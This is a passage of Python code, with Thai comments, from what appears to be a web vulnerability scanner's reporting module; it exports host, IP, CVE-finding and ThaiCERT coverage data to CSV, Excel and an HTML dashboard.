    """CSV ความครอบคลุม 8 กลุ่มระบบตามแนวทาง ThaiCERT + เพดานความสามารถของเครื่องมือ"""
    tc = _thaicert_coverage(data)
    avg = int(round(sum(x["cap"] for x in tc) / len(tc))) if tc else 0
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = csv.writer(f)
        w.writerow(["# ความครอบคลุมตามแนวทาง ThaiCERT — 8 กลุ่มระบบที่อาจใช้ PHP"])
        w.writerow(["# Capability_% = เพดานการตรวจจากภายนอกแบบไม่ล็อกอิน (remote unauthenticated) โดยประมาณ "
                    "ไม่ใช่ความแม่นของผลลัพธ์รายกรณี"])
        w.writerow([f"# ค่าเฉลี่ยทั้ง 8 กลุ่ม = {avg}%"])
        w.writerow(["Group_No", "Group_Name", "Example_Platforms", "Capability_%",
                    "Hosts_Found", "Detected_Items", "Scope_Limitation"])
        for x in tc:
            w.writerow([x["no"], x["name"], x["ex"], x["cap"],
                        x["hosts"], ("; ".join(x["items"]) if x["items"] else ""), x["note"]])
        w.writerow(["", "ค่าเฉลี่ย (Average)", "", avg, "", "", ""])


def _export_ip_csv(data, path):
    """CSV รายงาน IP Address แบบละเอียด — 2 ส่วน: สรุปต่อ IP + รายโฮสต์ต่อ IP"""
    import csv as _csv

    def _is_pub(ip):
        if not ip: return None
        try:
            p = [int(x) for x in ip.split(".")]
            if p[0] == 10: return False
            if p[0] == 172 and 16 <= p[1] <= 31: return False
            if p[0] == 192 and p[1] == 168: return False
            if p[0] == 127: return False
            return True
        except Exception: return None

    # สร้าง ip_map
    ip_map = {}
    for h in data["hosts"]:
        ip = h.get("ip") or ""
        if not ip: continue
        if ip not in ip_map:
            ip_map[ip] = {"ip": ip, "hosts": [], "pub": _is_pub(ip)}
        ip_map[ip]["hosts"].append(h)

    _RO = {"critical": 0, "warning": 1, "unknown": 2, "safe": 3, "n/a": 4}
    def _worst(hosts):
        best = "n/a"
        for h in hosts:
            l = h["risk_level"] if h["reachable"] else "n/a"
            if _RO.get(l, 9) < _RO.get(best, 9): best = l
        return best

    ip_list = sorted(ip_map.values(),
                     key=lambda d: (_RO.get(_worst(d["hosts"]), 9), -len(d["hosts"])))

    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = _csv.writer(f)

        # ── ส่วน 1: สรุปต่อ IP ──
        w.writerow(["=== สรุปรายงาน IP Address ==="])
        w.writerow(["IP_Address", "IP_Type", "Total_Hosts", "Reachable_Hosts",
                    "Critical_Hosts", "Warning_Hosts", "Unknown_Hosts", "Safe_Hosts",
                    "Unreachable_Hosts", "Max_CVSS", "Max_RiskIndex", "Worst_Level",
                    "TopCVEs", "All_Hostnames"])
        for d in ip_list:
            hosts = d["hosts"]
            pub = d["pub"]
            reachable = [h for h in hosts if h["reachable"]]
            unreachable = [h for h in hosts if not h["reachable"]]
            crit = sum(1 for h in reachable if h["risk_level"] == "critical")
            warn = sum(1 for h in reachable if h["risk_level"] == "warning")
            unk  = sum(1 for h in reachable if h["risk_level"] == "unknown")
            safe = sum(1 for h in reachable if h["risk_level"] == "safe")
            max_cvss = max((h.get("max_cvss") or 0 for h in hosts), default=0)
            max_idx  = max((h.get("risk_score") or 0 for h in hosts), default=0)
            worst    = _worst(hosts)
            # รวบรวม top CVE จากทุกโฮสต์
            all_cves = []
            seen_cves = set()
            for h in sorted(hosts, key=lambda h: -h.get("risk_score", 0)):
                for cve_entry in (h.get("top") or []):
                    cv = cve_entry.get("cve", "")
                    if cv and cv not in seen_cves:
                        all_cves.append(cv)
                        seen_cves.add(cv)
            top_cves = "; ".join(all_cves[:10])
            hostnames = "; ".join(h["host"] for h in hosts)
            ip_type = "Public" if pub is True else ("Private" if pub is False else "Unknown")
            w.writerow([d["ip"], ip_type, len(hosts), len(reachable),
                        crit, warn, unk, safe, len(unreachable),
                        (f"{max_cvss:.1f}" if (max_cvss > 0 or worst == "safe") else "—"), max_idx, worst, top_cves, hostnames])

        # ── ส่วน 2: รายโฮสต์ต่อ IP (แบบละเอียด) ──
        w.writerow([])
        w.writerow(["=== รายละเอียดโฮสต์แยกตาม IP ==="])
        w.writerow(["IP_Address", "IP_Type", "Host", "Reachable", "Server", "PHP", "CMS",
                    "LFI", "MaxCVSS", "RiskIndex", "RiskLevel",
                    "Vulnerable", "Warning", "Unknown", "Safe", "TopCVEs"])
        for d in ip_list:
            ip_type = "Public" if d["pub"] is True else ("Private" if d["pub"] is False else "Unknown")
            for h in sorted(d["hosts"], key=lambda h: (_RO.get(h["risk_level"] if h["reachable"] else "n/a", 9), -h.get("risk_score", 0))):
                cc = h["counts"]
                top = "; ".join(x.get("cve", "") for x in (h.get("top") or [])[:10])
                h_cvss = f"{h.get('max_cvss', 0):.1f}" if (h["reachable"] and (h.get("max_cvss", 0) > 0 or h["risk_level"] == "safe")) else "—"
                w.writerow([d["ip"], ip_type, h["host"],
                            "yes" if h["reachable"] else "no",
                            h["server"], h["php"], h["cms"], h["lfi"],
                            h_cvss, h["risk_score"],
                            h["risk_level"] if h["reachable"] else "n/a",
                            cc["vulnerable"], cc["warning"], cc["unknown"], cc["safe"], top])

        # ── ส่วน 3: โฮสต์ที่ยังไม่มี IP ──
        no_ip = [h for h in data["hosts"] if not h.get("ip")]
        if no_ip:
            w.writerow([])
            w.writerow(["=== โฮสต์ที่ยังไม่มีข้อมูล IP (สแกนด้วยไฟล์ v6 ใหม่เพื่อบันทึก IP) ==="])
            w.writerow(["Host", "Reachable", "Server", "RiskLevel", "RiskIndex"])
            for h in no_ip:
                w.writerow([h["host"], "yes" if h["reachable"] else "no",
                            h["server"], h["risk_level"] if h["reachable"] else "n/a",
                            h["risk_score"]])


def _export_host_csv(data, path):
    """CSV สรุปรายโฮสต์ — เปิดใน Excel จัดเรียง/กรองได้ทันที"""
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = csv.writer(f)
        w.writerow(["Host", "IP", "Reachable", "AssetCriticality", "Server", "PHP", "CMS", "LFI",
                    "MaxCVSS", "MaxEPSS", "MissingHeaders", "CookieIssue", "BannerDisclosed",
                    "RiskIndex", "RiskLevel", "Vulnerable", "Warning", "Unknown", "Safe", "TopCVEs"])
        for h in sorted(data["hosts"], key=lambda h: (not h["reachable"],
                        _RISK_ORDER.get(h["risk_level"], 9), -h["risk_score"])):
            cc = h["counts"]
            top = "; ".join(x.get("cve", "") for x in h["top"][:6])
            a = h.get("hdr") or {}
            w.writerow([h["host"], h.get("ip", ""), "yes" if h["reachable"] else "no",
                        "high" if h.get("crit_asset", 1) >= 2 else "normal",
                        h["server"], h["php"], h["cms"], h["lfi"],
                        (f"{h.get('max_cvss',0):.1f}" if (h["reachable"] and (h.get("max_cvss", 0) > 0 or h["risk_level"] == "safe")) else "—"),
                        (f"{int(h.get('max_epss',0)*100)}%" if h.get('max_epss', 0) else "—"),
                        len(a.get("missing", [])), "yes" if a.get("cookie_issues") else "no",
                        "yes" if a.get("disclosed") else "no",
                        h["risk_score"], h["risk_level"], cc["vulnerable"], cc["warning"],
                        cc["unknown"], cc["safe"], top])


def _export_excel(data, path):
    """Excel รายงานรวม 5 ชีต: ช่องโหว่ | โฮสต์ | IP Report | สรุป | ThaiCERT 8 กลุ่ม"""
    try:
        import openpyxl
        from openpyxl.styles import (PatternFill, Font, Alignment, Border, Side,
                                      numbers as _nums)
        from openpyxl.utils import get_column_letter
    except ImportError:
        print("  ⚠ ไม่พบ openpyxl — บันทึก CSV แทน")
        _export_csv(data, str(path).replace(".xlsx", "_findings.csv"))
        _export_host_csv(data, str(path).replace(".xlsx", "_hosts.csv"))
        _export_ip_csv(data, str(path).replace(".xlsx", "_ip.csv"))
        _export_thaicert_csv(data, str(path).replace(".xlsx", "_thaicert.csv"))
        return

    wb = openpyxl.Workbook()

    # ── สี header ──
    _HDR_FILL  = PatternFill("solid", fgColor="1a2a3a")
    _HDR_FONT  = Font(color="FFFFFF", bold=True, size=10)
    _WARN_FILL = PatternFill("solid", fgColor="FEF3CD")
    _CRIT_FILL = PatternFill("solid", fgColor="FADBD8")
    _SAFE_FILL = PatternFill("solid", fgColor="D5F5E3")
    _UNK_FILL  = PatternFill("solid", fgColor="EAECEE")
    _LIGHT_FILL = PatternFill("solid", fgColor="F8F9FA")
    _CENTER = Alignment(horizontal="center", vertical="center", wrap_text=True)
    _LEFT   = Alignment(horizontal="left",   vertical="center", wrap_text=True)

    def _hdr(ws, row_data, col_widths=None):
        row = ws.append(row_data) if False else None
        ws.append(row_data)
        hr = ws.max_row
        for c_idx, _ in enumerate(row_data, 1):
            cell = ws.cell(hr, c_idx)
            cell.fill = _HDR_FILL; cell.font = _HDR_FONT
            cell.alignment = _CENTER
        if col_widths:
            for i, w in enumerate(col_widths, 1):
                ws.column_dimensions[get_column_letter(i)].width = w
        ws.row_dimensions[hr].height = 20

    def _status_fill(bkt):
        return {"vulnerable": _CRIT_FILL, "warning": _WARN_FILL,
                "unknown":    _UNK_FILL,  "safe":    _SAFE_FILL}.get(bkt, None)

    def _risk_fill(lv):
        return {"critical": _CRIT_FILL, "warning": _WARN_FILL,
                "unknown":  _UNK_FILL,  "safe":    _SAFE_FILL}.get(lv, None)

    ip_lookup = {h["host"]: h.get("ip", "") for h in data.get("hosts", [])}

    # ══════════════════════════════════════════════════════════
    # ชีต 1 — ช่องโหว่ (Findings)
    # ══════════════════════════════════════════════════════════
    ws1 = wb.active
    ws1.title = "ช่องโหว่"
    ws1.freeze_panes = "A2"
    _hdr(ws1, ["#", "Host", "IP", "CVE", "CVSS", "EPSS", "CWE", "SLA_Days",
                "ชื่อช่องโหว่", "Category", "Severity", "Status", "Reason", "Host Check",
                "ยืนยันเมื่อ (🔴 กระทบ)", "ปลอดภัยเมื่อ (🟢)"],
          [5, 22, 14, 16, 7, 7, 10, 9, 36, 18, 13, 14, 36, 20, 44, 40])
    sev_colors = {"Critical": "C0392B", "High": "D35400", "Medium-High": "E67E22",
                  "Medium": "F39C12", "Low": "2980B9", "Info": "7F8C8D"}
    NCOL = 16
    for row_i, r in enumerate(sorted(data["all_results"],
                                      key=lambda x: (_host_label(x.get("target", "")),
                                                     _BUCKET_ORDER.get(_bucket_of(x.get("status")), 9))),
                               start=1):
        host_lbl = _host_label(r.get("target", "")) or data["target"]
        bkt = _bucket_of(r.get("status", ""))
        cf = _confirm_of(r.get("cve", "")) or {}
        eff_cvss = _assessed_cvss(r)
        cvss_cell_val = round(eff_cvss, 1) if eff_cvss is not None else "—"
        ws1.append([row_i, host_lbl, ip_lookup.get(host_lbl, ""), r.get("cve", ""),
                    cvss_cell_val, f"{int(_epss(r)*100)}%", _cwe(r), _sla_days(r),
                    r.get("name", ""), r.get("category", ""), r.get("severity", ""),
                    STATUS_LABELS.get(r.get("status"), r.get("status", "")),
                    r.get("reason", ""), r.get("host_check", ""),
                    cf.get("vuln", ""), cf.get("safe", "")])
        row = ws1.max_row
        fill = _status_fill(bkt)
        sev = r.get("severity", "")
        if fill:
            for col in range(1, NCOL + 1):
                ws1.cell(row, col).fill = fill
        # CVSS cell bold+color by assessed status/severity
        if bkt == "safe":
            ws1.cell(row, 5).font = Font(bold=True, color="1E7E34")
        elif bkt in ("vulnerable", "warning"):
            sev_c = sev_colors.get(sev)
            if sev_c:
                ws1.cell(row, 5).font = Font(bold=True, color=sev_c)
        if row_i % 2 == 0 and not fill:
            for col in range(1, NCOL + 1):
                ws1.cell(row, col).fill = _LIGHT_FILL
        for col in range(1, NCOL + 1):
            ws1.cell(row, col).alignment = _LEFT
    ws1.auto_filter.ref = f"A1:{get_column_letter(NCOL)}1"

    # ══════════════════════════════════════════════════════════
    # ชีต 2 — โฮสต์ (Host summary)
    # ══════════════════════════════════════════════════════════
    ws2 = wb.create_sheet("โฮสต์")
    ws2.freeze_panes = "A2"
    _hdr(ws2, ["#", "Host", "IP", "เข้าถึงได้", "ความสำคัญ", "Server", "PHP", "CMS", "LFI",
                "MaxCVSS", "MaxEPSS", "ขาด Header", "Cookie Issue", "Banner Disclosed",
                "ดัชนีเสี่ยง", "ระดับเสี่ยง", "ยืนยัน", "สัญญาณ", "ไม่ทราบ", "ปลอดภัย", "Top CVEs"],
          [5, 22, 14, 10, 12, 16, 8, 12, 6, 9, 9, 10, 12, 16, 10, 12, 8, 9, 9, 9, 40])
    for row_i, h in enumerate(sorted(data["hosts"], key=lambda h: (not h["reachable"],
                              _RISK_ORDER.get(h["risk_level"], 9), -h["risk_score"])), start=1):
        cc = h["counts"]
        top = "; ".join(x.get("cve", "") for x in h["top"][:8])
        a = h.get("hdr") or {}
        ws2.append([row_i, h["host"], h.get("ip",""),
                    "✓" if h["reachable"] else "✗",
                    "high" if h.get("crit_asset", 1) >= 2 else "normal",
                    h["server"], h["php"], h["cms"], h["lfi"],
                    (round(h.get("max_cvss", 0), 1) if (h["reachable"] and (h.get("max_cvss", 0) > 0 or h["risk_level"] == "safe")) else "—"),
                    (f"{int(h.get('max_epss',0)*100)}%" if h.get('max_epss', 0) else "—"),
                    len(a.get("missing", [])), "yes" if a.get("cookie_issues") else "no",
                    "yes" if a.get("disclosed") else "no",
                    h["risk_score"],
                    h["risk_level"] if h["reachable"] else "n/a",
                    cc["vulnerable"], cc["warning"], cc["unknown"], cc["safe"], top])
        row = ws2.max_row
        lv = h["risk_level"] if h["reachable"] else "n/a"
        fill = _risk_fill(lv)
        if fill:
            for col in range(1, 22): ws2.cell(row, col).fill = fill
        elif row_i % 2 == 0:
            for col in range(1, 22): ws2.cell(row, col).fill = _LIGHT_FILL
        for col in range(1, 22): ws2.cell(row, col).alignment = _LEFT
    ws2.auto_filter.ref = f"A1:{get_column_letter(21)}1"

    # ══════════════════════════════════════════════════════════
    # ชีต 3 — IP Report (3 ส่วน)
    # ══════════════════════════════════════════════════════════
    ws3 = wb.create_sheet("IP Report")

    def _is_pub(ip):
        if not ip: return None
        try:
            p = [int(x) for x in ip.split(".")]
            if p[0] == 10: return False
            if p[0] == 172 and 16 <= p[1] <= 31: return False
            if p[0] == 192 and p[1] == 168: return False
            if p[0] == 127: return False
            return True
        except Exception: return None

    ip_map = {}
    for h in data["hosts"]:
        ip = h.get("ip") or ""
        if not ip: continue
        if ip not in ip_map: ip_map[ip] = {"ip": ip, "hosts": [], "pub": _is_pub(ip)}
        ip_map[ip]["hosts"].append(h)

    _RO = {"critical": 0, "warning": 1, "unknown": 2, "safe": 3, "n/a": 4}
    def _worst(hosts):
        best = "n/a"
        for h in hosts:
            l = h["risk_level"] if h["reachable"] else "n/a"
            if _RO.get(l, 9) < _RO.get(best, 9): best = l
        return best

    ip_list = sorted(ip_map.values(), key=lambda d: (_RO.get(_worst(d["hosts"]), 9), -len(d["hosts"])))

    # ส่วน 1: สรุปต่อ IP
    ws3.append(["▶ ส่วนที่ 1 — สรุปรายงาน IP Address"])
    ws3.cell(ws3.max_row, 1).font = Font(bold=True, size=11)
    ws3.append([])
    _hdr(ws3, ["IP_Address", "IP_Type", "Total_Hosts", "เข้าถึงได้", "Critical", "Warning",
                "Unknown", "Safe", "เข้าไม่ถึง", "MaxCVSS", "MaxRiskIndex", "Worst_Level",
                "Top CVEs", "ชื่อโฮสต์ทั้งหมด"],
          [14, 9, 12, 12, 9, 9, 9, 9, 12, 9, 12, 12, 40, 50])
    for d in ip_list:
        hosts = d["hosts"]
        reachable = [h for h in hosts if h["reachable"]]
        unreachable = [h for h in hosts if not h["reachable"]]
        crit = sum(1 for h in reachable if h["risk_level"] == "critical")
        warn = sum(1 for h in reachable if h["risk_level"] == "warning")
        unk  = sum(1 for h in reachable if h["risk_level"] == "unknown")
        safe = sum(1 for h in reachable if h["risk_level"] == "safe")
        max_cvss = max((h.get("max_cvss") or 0 for h in hosts), default=0)
        max_idx  = max((h.get("risk_score") or 0 for h in hosts), default=0)
        worst    = _worst(hosts)
        all_cves, seen_cves = [], set()
        for h in sorted(hosts, key=lambda h: -h.get("risk_score", 0)):
            for cve_entry in (h.get("top") or []):
                cv = cve_entry.get("cve", "")
                if cv and cv not in seen_cves: all_cves.append(cv); seen_cves.add(cv)
        ip_type = "Public" if d["pub"] is True else ("Private" if d["pub"] is False else "Unknown")
        ws3.append([d["ip"], ip_type, len(hosts), len(reachable),
                    crit, warn, unk, safe, len(unreachable),
                    (round(max_cvss, 1) if (max_cvss > 0 or worst == "safe") else "—"), max_idx, worst,
                    "; ".join(all_cves[:10]), "; ".join(h["host"] for h in hosts)])
        fill = _risk_fill(worst)
        if fill:
            for col in range(1, 15): ws3.cell(ws3.max_row, col).fill = fill

    # ส่วน 2: รายละเอียด
    ws3.append([]); ws3.append([])
    ws3.append(["▶ ส่วนที่ 2 — รายละเอียดโฮสต์แยกตาม IP"])
    ws3.cell(ws3.max_row, 1).font = Font(bold=True, size=11)
    ws3.append([])
    _hdr(ws3, ["IP_Address", "IP_Type", "Host", "เข้าถึงได้", "Server", "PHP", "CMS", "LFI",
                "MaxCVSS", "RiskIndex", "RiskLevel", "ยืนยัน", "สัญญาณ", "ไม่ทราบ", "ปลอดภัย", "Top CVEs"],
          [14, 9, 24, 10, 14, 8, 10, 6, 9, 10, 11, 8, 9, 9, 9, 40])
    for d in ip_list:
        ip_type = "Public" if d["pub"] is True else ("Private" if d["pub"] is False else "Unknown")
        for h in sorted(d["hosts"], key=lambda h: (_RO.get(h["risk_level"] if h["reachable"] else "n/a", 9),
                                                    -h.get("risk_score", 0))):
            cc = h["counts"]
            top = "; ".join(x.get("cve", "") for x in (h.get("top") or [])[:10])
            lv = h["risk_level"] if h["reachable"] else "n/a"
            ws3.append([d["ip"], ip_type, h["host"],
                        "✓" if h["reachable"] else "✗",
                        h["server"], h["php"], h["cms"], h["lfi"],
                        (round(h.get("max_cvss", 0), 1) if (h["reachable"] and (h.get("max_cvss", 0) > 0 or h["risk_level"] == "safe")) else "—"), h["risk_score"], lv,
                        cc["vulnerable"], cc["warning"], cc["unknown"], cc["safe"], top])
            fill = _risk_fill(lv)
            if fill:
                for col in range(1, 17): ws3.cell(ws3.max_row, col).fill = fill

    # ส่วน 3: ไม่มี IP
    no_ip = [h for h in data["hosts"] if not h.get("ip")]
    if no_ip:
        ws3.append([]); ws3.append([])
        ws3.append(["▶ ส่วนที่ 3 — โฮสต์ที่ยังไม่มี IP"])
        ws3.cell(ws3.max_row, 1).font = Font(bold=True, size=11)
        ws3.append([])
        _hdr(ws3, ["Host", "เข้าถึงได้", "Server", "RiskLevel", "RiskIndex"],
              [24, 10, 16, 12, 10])
        for h in no_ip:
            ws3.append([h["host"], "✓" if h["reachable"] else "✗",
                        h["server"], h["risk_level"] if h["reachable"] else "n/a",
                        h["risk_score"]])

    # ══════════════════════════════════════════════════════════
    # ชีต 4 — สรุป (Summary stats)
    # ══════════════════════════════════════════════════════════
    ws4 = wb.create_sheet("สรุป")
    s = data["stats"]
    ws4.column_dimensions["A"].width = 32
    ws4.column_dimensions["B"].width = 18
    ws4.column_dimensions["C"].width = 32
    ws4.column_dimensions["D"].width = 18

    def _kv(ws, label, val, label2="", val2=""):
        ws.append([label, val, label2, val2])
        r = ws.max_row
        ws.cell(r, 1).font = Font(bold=True); ws.cell(r, 1).alignment = _LEFT
        ws.cell(r, 2).alignment = _CENTER
        if label2:
            ws.cell(r, 3).font = Font(bold=True); ws.cell(r, 3).alignment = _LEFT
            ws.cell(r, 4).alignment = _CENTER

    # CVSS สูงสุดของทั้งการสแกน — นับเฉพาะรายการที่มีผลกระทบจริง (เสี่ยง/อาจเสี่ยง) ไม่รวม "ไม่ทราบ"
    _max_cvss_all = max((_cvss(r) for r in data.get("all_results", [])
                         if _bucket_of(r.get("status")) in ("vulnerable", "warning")), default=0.0)
    _risk_lvl_th = {"critical": "เสี่ยงสูง", "warning": "ปานกลาง",
                    "unknown": "ยังไม่ทราบ", "safe": "ปลอดภัย"}

    ws4.append(["📊 สรุปผลการสแกน"])
    ws4.cell(1, 1).font = Font(bold=True, size=14, color="1a2a3a")
    ws4.append([])
    _kv(ws4, "เป้าหมาย", data["target"], "วันที่รายงาน", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    _kv(ws4, "ระดับความเสี่ยงรวม", _risk_lvl_th.get(s.get("risk_level",""), s.get("risk_level","-")),
        "ดัชนีเสี่ยงรวม (0–100)", s.get("risk_score", 0))
    ws4.append([])
    _kv(ws4, "โฮสต์ทั้งหมด", s.get("hosts_total",0), "เข้าถึงได้", s.get("hosts_reachable",0))
    _kv(ws4, "โฮสต์ยืนยันเสี่ยง (Vulnerable)", s.get("hosts_vulnerable",0),
        "โฮสต์อาจเสี่ยง (Warning)", s.get("hosts_warning",0))
    _kv(ws4, "โฮสต์ปลอดภัย (Safe)", s.get("hosts_safe",0), "โฮสต์ยังไม่ทราบ (Unknown)", s.get("hosts_unknown",0))
    _kv(ws4, "โฮสต์เข้าไม่ถึง (Unreachable)", s.get("hosts_unreachable",0), "", "")
    ws4.append([])
    _kv(ws4, "ช่องโหว่ที่ตรวจทั้งหมด", s.get("total",0), "ยืนยัน (Vulnerable)", s.get("vulnerable",0))
    _kv(ws4, "พบสัญญาณ (Warning)", s.get("warning",0), "ยังไม่ทราบ (Unknown)", s.get("unknown",0))
    _kv(ws4, "ปลอดภัย (Safe)", s.get("safe",0), "CVSS สูงสุด",
        (round(_max_cvss_all, 1) if (_max_cvss_all > 0 or (s.get("safe", 0) > 0 and s.get("unknown", 0) == 0)) else "—"))
    _kv(ws4, "สัดส่วนเปิดเผย (Exposure %)", f"{s.get('exposure_pct',0)}%", "", "")
    ws4.append([])
    ws4.append(["ระดับความรุนแรง (เฉพาะที่มีผลกระทบ)"]); ws4.cell(ws4.max_row, 1).font = Font(bold=True, size=11)
    sd = s.get("by_severity_impact") or s.get("by_severity", {})
    if not any(sd.get(k, 0) for k in ["Critical", "High", "Medium", "Low", "Info"]):
        ws4.append(["  (ไม่มีรายการที่ยืนยัน/อาจเสี่ยง)", ""])
    for sev in ["Critical", "High", "Medium", "Low", "Info"]:
        if sd.get(sev, 0):
            ws4.append(["  " + sev, sd[sev]])
            ws4.cell(ws4.max_row, 2).alignment = _CENTER
    ws4.append([])
    ws4.append(["ประเภทช่องโหว่ (เฉพาะที่มีผลกระทบ)"]); ws4.cell(ws4.max_row, 1).font = Font(bold=True, size=11)
    cd = s.get("by_category_impact")
    if cd is None:  # เผื่อ stats เก่าไม่มี key — คำนวณจาก by_category (vuln+warn)
        cd = {k: (v.get("vulnerable", 0) + v.get("warning", 0)) for k, v in s.get("by_category", {}).items()}
    cd = {k: v for k, v in cd.items() if v}
    if not cd:
        ws4.append(["  (ไม่มีรายการที่ยืนยัน/อาจเสี่ยง)", ""])
    for cat, n in sorted(cd.items(), key=lambda x: -x[1]):
        ws4.append(["  " + cat, n])
        ws4.cell(ws4.max_row, 2).alignment = _CENTER

    # ══════════════════════════════════════════════════════════
    # ชีต 5 — ความครอบคลุม 8 กลุ่มระบบ ThaiCERT
    # ══════════════════════════════════════════════════════════
    _tc = _thaicert_coverage(data)
    if _tc:
        ws5 = wb.create_sheet("ThaiCERT 8 กลุ่ม")
        _avg = int(round(sum(x["cap"] for x in _tc) / len(_tc)))
        ws5.append(["🛡 ความครอบคลุมตามแนวทาง ThaiCERT — 8 กลุ่มระบบที่อาจใช้ PHP"])
        ws5.cell(1, 1).font = Font(bold=True, size=13, color="1a2a3a")
        ws5.append([f"ความสามารถ (%) = เพดานการตรวจจากภายนอกแบบไม่ล็อกอิน (remote unauthenticated) โดยประมาณ "
                    f"— ไม่ใช่ความแม่นของผลลัพธ์รายกรณี · เฉลี่ยทั้ง 8 กลุ่ม ≈ {_avg}%"])
        ws5.cell(2, 1).font = Font(italic=True, size=9, color="6b7280")
        ws5.append([])
        _hdr(ws5, ["#", "กลุ่มระบบ", "ตัวอย่างแพลตฟอร์ม", "ความสามารถ (%)",
                   "พบในสแกนนี้ (โฮสต์)", "สิ่งที่พบ", "ขอบเขต / จุดอ่อน"],
             [5, 34, 34, 15, 18, 34, 56])
        ws5.freeze_panes = "A5"
        for x in _tc:
            ws5.append([x["no"], x["name"], x["ex"], x["cap"] / 100.0,
                        x["hosts"], ", ".join(x["items"]) if x["items"] else "— ไม่พบ", x["note"]])
            r = ws5.max_row
            # แถบสีตามระดับความสามารถ: ≥70 เขียว, ≥45 เหลือง, <45 แดงอ่อน
            fill = (_SAFE_FILL if x["cap"] >= 70 else (_WARN_FILL if x["cap"] >= 45 else _CRIT_FILL))
            ws5.cell(r, 4).fill = fill
            ws5.cell(r, 4).font = Font(bold=True)
            ws5.cell(r, 4).number_format = "0%"
            ws5.cell(r, 4).alignment = _CENTER
            ws5.cell(r, 1).alignment = _CENTER
            ws5.cell(r, 5).alignment = _CENTER
            for col in (2, 3, 6, 7):
                ws5.cell(r, col).alignment = _LEFT
            if not x["hosts"]:
                ws5.cell(r, 6).font = Font(color="9aa0ab")
        ws5.append([])
        ws5.append(["", "ค่าเฉลี่ยความสามารถทั้ง 8 กลุ่ม", "", _avg / 100.0])
        _ar = ws5.max_row
        ws5.cell(_ar, 2).font = Font(bold=True)
        ws5.cell(_ar, 4).font = Font(bold=True); ws5.cell(_ar, 4).number_format = "0%"
        ws5.cell(_ar, 4).alignment = _CENTER

    wb.save(path)


def _build_html_dashboard(data, path):
    """แดชบอร์ด HTML แบบ interactive (เปิดในเบราว์เซอร์ได้ทันที, ไม่ต้องต่อเน็ต)"""
    import html as _html
    import json as _json
    s = data["stats"]
    multi = data.get("is_multi")
    lvl_color = {"critical": "#e03131", "warning": "#f08c00", "unknown": "#868e96",
                 "safe": "#2e9e5b", "n/a": "#c7ccd6"}
    lvl_text = {"critical": "เสี่ยงสูง", "warning": "ปานกลาง", "unknown": "ยังไม่ทราบ",
                "safe": "ปลอดภัย", "n/a": "เข้าไม่ถึง"}
    def _f(x):
        """แปลง finding dict เป็น JS object (ใช้ทั้ง hosts_js และ findings_js)
        ตามมาตรฐาน CVSS v3.1:
        - รายการที่ปลอดภัย (patched / not-exploitable / mitigated / n/a) มีคะแนน CVSS ที่ประเมินบนเครื่องจริง = 0.0 (None)
        - รายการที่พบช่องโหว่/สัญญาณเสี่ยง (vulnerable / warning) มีคะแนน CVSS = Base CVSS ของ CVE
        - รายการที่ยังสรุปไม่ได้ (unknown) มีคะแนน CVSS ที่ประเมิน = None (แต่เก็บ base_cvss ไว้อ้างอิง)
        """
        bkt = _bucket_of(x.get("status", ""))
        cvss_v = _cvss(x)
        eff_cvss = _assessed_cvss(x)
        return {"cve":       x.get("cve", ""),
                "cat":       x.get("category", ""),
                "name":      x.get("name", ""),
                "cvss":      eff_cvss,
                "base_cvss": cvss_v,
                "sev":       x.get("severity", "").split("(")[0].strip(),
                "status":    x.get("status", ""),
                "bucket":    bkt,
                "label":     STATUS_LABELS.get(x.get("status"), x.get("status", "")),
                "explain":   STATUS_EXPLAIN.get(x.get("status"), ""),
                "reason":    x.get("reason", ""),
                "hcheck":    x.get("host_check", ""),
                "confirm":   _confirm_of(x.get("cve", "")),
                "trigger":   x.get("trigger", "")}

    hosts_js = [{"host": h["host"], "ip": h.get("ip", ""), "reachable": h["reachable"],
                 "server": h["server"] or "", "php": h["php"] or "", "cms": h["cms"] or "",
                 "stack": h.get("stack", []), "waf": h.get("waf", ""), "device": h.get("device", ""),
                 "os": h.get("os", ""), "components": h.get("components", []),
                 "mac": h.get("mac", ""), "mac_vendor": h.get("mac_vendor", ""),
                 "lan": h.get("lan", False),
                 "tech": h.get("tech", []),
                 "lfi": h["lfi"], "score": h["risk_score"], "maxcvss": h.get("max_cvss", 0),
                 "level": h["risk_level"], **h["counts"],
                 "hdr": h.get("hdr", {}),
                 "findings": [_f(x) for x in h.get("findings", [])]}
                for h in data["hosts"]]

    findings_js = [dict(_f(r), host=_host_label(r.get("target", "")))
                   for r in data["all_results"]]

    payload = _json.dumps({"stats": {k: s[k] for k in s if k not in ("by_category", "by_severity", "verdict")},
                           "by_severity": s["by_severity"], "by_category": s["by_category"],
                           "verdict": s["verdict"], "target": data["target"],
                           "scan_date": data["scan_date"], "multi": multi,
                           "thaicert": _thaicert_coverage(data),
                           "hosts": hosts_js, "findings": findings_js},
                          ensure_ascii=False)

    # เมทริกซ์ โฮสต์ × CVE แบบไดนามิกเต็มรูปแบบ (เรนเดอร์ใน JS ตามทุกตัวกรอง)
    matrix_html = (
        "<div style='margin-bottom:12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap'>"
        "  <span style='font-size:12px;font-weight:700;color:var(--ink)'>คำอธิบายสัญลักษณ์ (คลิกเพื่อกรอง):</span>"
        "  <span class='pill' style='background:var(--vuln);cursor:pointer' onclick=\"filterByBucket('vulnerable')\" title='คลิกเพื่อแสดงเฉพาะรายการที่ยืนยันแล้ว'>✕ ยืนยันแล้ว (เสี่ยง) 🔍</span>"
        "  <span class='pill' style='background:var(--warn);cursor:pointer' onclick=\"filterByBucket('warning')\" title='คลิกเพื่อแสดงเฉพาะรายการที่อาจเสี่ยง'>! อาจเสี่ยง 🔍</span>"
        "  <span class='pill' style='background:var(--unk);cursor:pointer' onclick=\"filterByBucket('unknown')\" title='คลิกเพื่อแสดงเฉพาะรายการที่ยังไม่ทราบ'>? ยังไม่ทราบ 🔍</span>"
        "  <span class='pill' style='background:var(--safe);cursor:pointer' onclick=\"filterByBucket('safe')\" title='คลิกเพื่อแสดงเฉพาะรายการที่ปลอดภัย'>✓ ปลอดภัย 🔍</span>"
        "  <span class='pill' style='background:#e0e7ff;color:#1e3a8a;cursor:pointer' onclick='clearGlobalFilter()'>↺ ล้างตัวกรองทั้งหมด</span>"
        "</div>"
        "<div class='tbl-wrap' id='mxtbl-wrap' style='max-height:none'>"
        "  <table class='mxtbl' id='mxtbl'><thead id='mxthd'></thead><tbody id='mxtb'></tbody></table>"
        "</div>"
